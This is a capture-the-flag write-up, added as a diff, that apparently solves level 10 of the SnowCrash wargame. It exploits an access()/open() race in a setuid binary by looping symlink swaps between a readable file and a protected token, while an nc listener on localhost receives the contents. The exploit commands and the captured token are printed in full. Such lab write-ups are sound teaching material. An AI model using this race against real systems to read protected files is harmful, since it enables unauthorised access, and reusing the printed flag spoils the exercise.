@@ -1,0 +1,49 @@
+For this level, we have again a "level10" executable and a "token" file.
+
+"./level10" => "./level10 file host
+	sends file to host if you have access to it"
+"./level10 token localhost" => "You don't have access to token"
+"./level10 .profile localhost" => "Connecting to localhost:6969 .. Unable to connect to host localhost"
+
+It seems that level10 is sending the file in the first arg to the host in the second arg if we have the permission of that file.
+
+When we analyze with ltrace, we can see that it is calling "access()" to check something and it return -1 and printf "You dont't have access".
+
+Let's create a simple server in our VM to capture the file.
+
+"nc -lk 127.0.0.1 6969"
+
+`echo "hello" > /tmp/test`
+"./level10 /tmp/test 127.0.0.1" => "Connecting to 127.0.0.1:6969 .. Connected! Sending file .. wrote file!"
+
+"level10@SnowCrash:~$ nc -lk 127.0.0.1 6969
+.*( )*.
+hello"
+
+In the man it said that "access()" have a security hole and is not safe to use. Let's try to exploit this.
+
+"https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole"
+
+Someone explain that we can exploit the small time between the checking of the permission and the reading of the file.
+First we will let the program do "access" on the file that we have the permission on, once it checked that the file is okay, we will quickly do a symlink to token file.
+
+"while true; do ln -fs ~/.profile /tmp/exploit_level10; ln -fs ~/token /tmp/exploit_level10; done"
+"while true; do ./level10 /tmp/exploit_level10 127.0.0.1; done"
+
+Result on server side:
+
+".*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c"
